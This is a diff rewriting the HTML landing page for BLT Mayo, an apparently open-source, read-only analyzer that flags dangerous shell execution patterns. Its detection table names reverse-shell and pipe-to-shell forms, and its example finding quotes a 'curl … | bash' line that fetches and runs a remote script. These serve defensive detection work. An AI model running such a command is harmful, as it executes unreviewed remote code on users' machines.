@@ -1,7 +1,258 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BLT Mayo — Safe shell analysis</title><style>:root{color-scheme:dark;--red:#e11d48;--ink:#f8fafc;--muted:#a8b3c7}*{box-sizing:border-box}body{margin:0;font:16px/1.65 system-ui;background:radial-gradient(circle at 80% 10%,#4c1023,transparent 34%),#080b12;color:var(--ink)}main{max-width:940px;margin:auto;padding:8rem 1.5rem}small{color:#fda4af;font-weight:800;letter-spacing:.14em}h1{font-size:clamp(3rem,10vw,6.5rem);line-height:.9;margin:.25em 0}.lead{font-size:1.3rem;color:var(--muted);max-width:700px}.actions{display:flex;gap:1rem;flex-wrap:wrap;margin:2rem 0}a{color:white}.button{padding:.8rem 1.1rem;border-radius:.7rem;background:var(--red);text-decoration:none;font-weight:750}.ghost{background:#ffffff12;border:1px solid #ffffff2b}pre{padding:1.2rem;border:1px solid #ffffff25;border-radius:1rem;background:#05070b;overflow:auto}section{margin-top:4rem}h2{font-size:2rem}</style><script src="https://owaspblt.org/_shared/blt-analytics.js" defer></script></head><body><main><small>OWASP BLT SECURITY TOOL</small><h1>BLT Mayo</h1><p class="lead">A read-only shell dangerous-execution analyzer. Find pipe-to-shell, reverse-shell, encoded execution, dynamic eval, and nested-shell patterns without executing inspected files.</p><div class="actions"><a class="button" href="https://git.owaspblt.org/BLT/BLT-Mayo">Source code</a><a class="button ghost" href="https://waypoint.owaspblt.org/">All BLT projects</a></div><section><h2>Run locally</h2><pre><code>git clone https://git.owaspblt.org/BLT.git
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>BLT Mayo – Safe shell analysis</title>
+  <meta name="description" content="BLT Mayo (Monitor, Analyze, Yield, Observe) is a read-only Linux security-auditing tool from OWASP BLT that finds dangerous shell execution patterns without executing the files it inspects." />
+  <link rel="icon" type="image/svg+xml" href="logo.svg" />
+  <script src="theme-init.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
+    crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <link rel="stylesheet" href="styles.css" />
+  <script src="https://owaspblt.org/_shared/blt-nav.js" defer></script>
+  <script src="https://owaspblt.org/_shared/blt-analytics.js" defer></script>
+</head>
+<body>
+  <blt-nav project="blt-mayo" name="Mayo" data-sticky>
+    <a href="#detections">Detections</a>
+    <a href="#safety">Safety</a>
+    <a href="#install">Install</a>
+    <a href="#testing">Testing</a>
+    <a href="https://git.owaspblt.org/BLT/issues?label=blt-mayo" target="_blank" rel="noopener noreferrer">Issues</a>
+    <a href="https://git.owaspblt.org/BLT/tree/main/blt-mayo" slot="actions" data-primary target="_blank" rel="noopener noreferrer">Contribute</a>
+  </blt-nav>
+
+  <main>
+    <section class="hero">
+      <div class="wrap">
+        <img class="hero-logo" src="logo.svg" alt="BLT Mayo logo" width="168" height="168" />
+        <div>
+          <span class="badge"><i class="fa-solid fa-shield-halved" aria-hidden="true"></i> OWASP BLT security tool</span>
+          <h1>BLT <span>Mayo</span></h1>
+          <p class="lead">A read-only shell dangerous-execution analyzer. Find pipe-to-shell, reverse-shell, encoded execution, dynamic eval, and nested-shell patterns without executing inspected files.</p>
+          <div class="actions">
+            <a class="btn primary" href="#install"><i class="fa-solid fa-terminal" aria-hidden="true"></i> Run locally</a>
+            <a class="btn" href="https://git.owaspblt.org/BLT/tree/main/blt-mayo" target="_blank" rel="noopener noreferrer"><i class="fa-solid fa-code-branch" aria-hidden="true"></i> Source code</a>
+            <a class="btn" href="https://waypoint.owaspblt.org/"><i class="fa-solid fa-layer-group" aria-hidden="true"></i> All BLT projects</a>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="about">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Monitor, Analyze, Yield, Observe</h2>
+          <p>BLT-MAYO is a read-only Linux security-auditing workflow that turns filesystem artifacts into structured, explainable security findings, shown in the terminal and written as a JSON report.</p>
+        </div>
+        <div class="grid two">
+          <div class="card">
+            <h3><span class="icon"><i class="fa-solid fa-diagram-project" aria-hidden="true"></i></span> How a scan flows</h3>
+            <ol class="steps">
+              <li>Path arguments or a YAML configuration</li>
+              <li><code>ScanOrchestrator</code> and safe filesystem traversal</li>
+              <li>Metadata, path sensitivity and artifact classification</li>
+              <li><code>AnalyzerRegistry</code> dispatches to <code>ShellScriptAnalyzer</code></li>
+              <li>Reusable shell execution rules</li>
+              <li>Normalized <code>Finding</code> objects</li>
+              <li>Terminal output and a JSON report</li>
+            </ol>
+          </div>
+          <div class="card">
+            <h3><span class="icon"><i class="fa-solid fa-terminal" aria-hidden="true"></i></span> Commands</h3>
+            <p><code>blt-mayo scan</code> scans files or directories, <code>blt-mayo report</code> summarises a saved JSON report and <code>blt-mayo doctor</code> checks the local runtime.</p>
+            <p><code>compare</code>, <code>review</code>, <code>bundle</code>, <code>export</code> and <code>blt-submit</code> are scaffolded and not implemented yet.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="detections">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Shell detections</h2>
+          <p>Each rule produces a finding with a rule ID, severity, confidence, a line-level snippet and remediation advice.</p>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th scope="col">Rule ID</th><th scope="col">Detection</th><th scope="col">Severity</th><th scope="col">Confidence</th></tr></thead>
+            <tbody>
+              <tr><td><code>SHELL-PIPE-TO-SHELL</code></td><td><code>curl</code>/<code>wget</code> piped into a shell</td><td><span class="pill critical">Critical</span></td><td>High</td></tr>
+              <tr><td><code>SHELL-REVERSE-SHELL</code></td><td>Common reverse-shell command forms</td><td><span class="pill critical">Critical</span></td><td>High</td></tr>
+              <tr><td><code>SHELL-ENCODED-EXECUTION</code></td><td>Base64 decode piped into a shell</td><td><span class="pill high">High</span></td><td>High</td></tr>
+              <tr><td><code>SHELL-EVAL</code></td><td>Dynamic shell <code>eval</code></td><td><span class="pill high">High</span></td><td>Medium</td></tr>
+              <tr><td><code>SHELL-NESTED-SHELL</code></td><td>Nested shell execution using <code>-c</code></td><td><span class="pill">Medium</span></td><td>Medium</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="safety">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Safety model</h2>
+          <p>Mayo reads; it never runs, changes or uploads anything.</p>
+        </div>
+        <div class="card">
+          <ul class="checklist grid two">
+            <li><i class="fa-solid fa-check" aria-hidden="true"></i> Inspected scripts are read as text and are never executed or sourced.</li>
+            <li><i class="fa-solid fa-check" aria-hidden="true"></i> Files are never modified.</li>
+            <li><i class="fa-solid fa-check" aria-hidden="true"></i> Symlinks are not followed by default.</li>
+            <li><i class="fa-solid fa-check" aria-hidden="true"></i> Traversal has configurable exclusions, depth and file-size limits.</li>
+            <li><i class="fa-solid fa-check" aria-hidden="true"></i> Invalid byte sequences are replaced safely.</li>
+            <li><i class="fa-solid fa-check" aria-hidden="true"></i> Missing or unreadable files do not crash the analyzer.</li>
+            <li><i class="fa-solid fa-check" aria-hidden="true"></i> Evidence is restricted to a concise line-level snippet.</li>
+            <li><i class="fa-solid fa-check" aria-hidden="true"></i> Nothing is uploaded or submitted automatically.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="install">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Run locally</h2>
+          <p>Requires Python 3.11 or newer. Linux (Fedora, Ubuntu, Debian) or WSL is recommended.</p>
+        </div>
+        <div class="grid two">
+          <div class="card">
+            <p class="code-label">Linux, macOS or WSL</p>
+<pre><code>git clone https://git.owaspblt.org/BLT.git
 cd blt-mayo
 python -m venv .venv
 source .venv/bin/activate
-pip install -e .
+python -m pip install --upgrade pip
+python -m pip install -e ".[dev]"
 blt-mayo doctor
-blt-mayo scan /path/to/review</code></pre></section></main></body></html>
+blt-mayo scan /path/to/review</code></pre>
+          </div>
+          <div class="card">
+            <p class="code-label">Windows PowerShell</p>
+<pre><code>py -m venv .venv
+.\.venv\Scripts\Activate.ps1
+python -m pip install --upgrade pip
+python -m pip install -e ".[dev]"</code></pre>
+            <p>Use <code>pip install -e .</code> instead of <code>".[dev]"</code> if you only need the scanner, not the test tools.</p>
+          </div>
+        </div>
+
+        <div class="grid two" style="margin-top:16px">
+          <div class="card">
+            <p class="code-label">Scan and report</p>
+<pre><code><span class="c"># Scan the supplied shell fixtures</span>
+blt-mayo scan tests/fixtures/shell
+
+<span class="c"># Write a JSON report</span>
+blt-mayo scan tests/fixtures/shell --output shell-scan-report.json
+
+<span class="c"># Use the example YAML configuration</span>
+blt-mayo scan --config blt-mayo.example.yml --output shell-scan-report.json</code></pre>
+          </div>
+          <div class="card">
+            <p class="code-label">Configuration</p>
+<pre><code>enabled_analyzers:
+  - shell</code></pre>
+            <p>See <a href="https://git.owaspblt.org/BLT/blob/main/blt-mayo/blt-mayo.example.yml" target="_blank" rel="noopener noreferrer"><code>blt-mayo.example.yml</code></a> for every traversal and evidence setting.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="example">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Example finding</h2>
+          <p>A script containing <code>curl -fsSL https://example.invalid/install.sh | bash</code> produces a normalized finding similar to:</p>
+        </div>
+<pre><code>{
+  "rule_id": "SHELL-PIPE-TO-SHELL",
+  "title": "Remote content piped directly to a shell",
+  "category": "dangerous-execution",
+  "severity": "critical",
+  "confidence": "high",
+  "artifact_type": "shell_script",
+  "evidence": {
+    "summary": "Matched dangerous shell construction near line 3",
+    "line_number": 3,
+    "snippet": "curl -fsSL https://example.invalid/install.sh | bash"
+  },
+  "remediation": "Download the file to a controlled location, verify its source and checksum, review the contents, and only then execute it."
+}</code></pre>
+      </div>
+    </section>
+
+    <section class="section" id="testing">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Testing and status</h2>
+          <p>Version 0.3.1. The shell analyzer is the first analyzer in place; the suite covers each rule, safe commands, missing-file and invalid UTF-8 handling, scanner-to-analyzer dispatch, JSON reports and the CLI.</p>
+        </div>
+        <div class="grid two">
+          <div class="card">
+<pre><code><span class="c"># Lint and compile</span>
+ruff check src tests
+python -m compileall -q src tests/test_*.py tests/conftest.py
+
+<span class="c"># All tests, then coverage enforcement</span>
+pytest
+pytest --cov=blt_mayo --cov-report=term-missing --cov-fail-under=80
+
+<span class="c"># Focused acceptance workflow</span>
+scripts/run_shell_acceptance.sh</code></pre>
+          </div>
+          <div class="card">
+            <h3><span class="icon"><i class="fa-solid fa-vial-circle-check" aria-hidden="true"></i></span> Last validated</h3>
+            <ul class="checklist">
+              <li><i class="fa-solid fa-check" aria-hidden="true"></i> 35 tests passed</li>
+              <li><i class="fa-solid fa-check" aria-hidden="true"></i> 85.91% total coverage (80% required)</li>
+              <li><i class="fa-solid fa-check" aria-hidden="true"></i> Ruff and compilation passed</li>
+              <li><i class="fa-solid fa-check" aria-hidden="true"></i> Focused shell acceptance scan passed</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="links">
+      <div class="wrap">
+        <div class="section-head">
+          <h2>Get involved</h2>
+          <p>BLT Mayo is part of the OWASP BLT monorepo. Issues and pull requests are welcome.</p>
+        </div>
+        <div class="links">
+          <a class="card link-card" href="https://git.owaspblt.org/BLT/tree/main/blt-mayo" target="_blank" rel="noopener noreferrer">
+            <span class="icon"><i class="fa-solid fa-code" aria-hidden="true"></i></span>
+            <div><strong>Source</strong><span>BLT/tree/main/blt-mayo</span></div>
+          </a>
+          <a class="card link-card" href="https://git.owaspblt.org/BLT/issues?label=blt-mayo" target="_blank" rel="noopener noreferrer">
+            <span class="icon"><i class="fa-solid fa-circle-dot" aria-hidden="true"></i></span>
+            <div><strong>Issues</strong><span>Label blt-mayo</span></div>
+          </a>
+          <a class="card link-card" href="https://git.owaspblt.org/BLT/blob/main/blt-mayo/docs/SHELL_ANALYZER.md" target="_blank" rel="noopener noreferrer">
+            <span class="icon"><i class="fa-solid fa-book" aria-hidden="true"></i></span>
+            <div><strong>Analyzer docs</strong><span>SHELL_ANALYZER.md</span></div>
+          </a>
+          <a class="card link-card" href="https://waypoint.owaspblt.org/">
+            <span class="icon"><i class="fa-solid fa-layer-group" aria-hidden="true"></i></span>
+            <div><strong>All BLT projects</strong><span>waypoint.owaspblt.org</span></div>
+          </a>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div class="wrap">
+      <span>BLT Mayo · part of <a href="https://owaspblt.org/">OWASP BLT</a></span>
+      <nav aria-label="Footer">
+        <a href="https://git.owaspblt.org/BLT/tree/main/blt-mayo" target="_blank" rel="noopener noreferrer">Source</a>
+        <a href="https://git.owaspblt.org/BLT/issues?label=blt-mayo" target="_blank" rel="noopener noreferrer">Issues</a>
+        <a href="https://waypoint.owaspblt.org/">All projects</a>
+      </nav>
+    </div>
+  </footer>
+</body>
+</html>
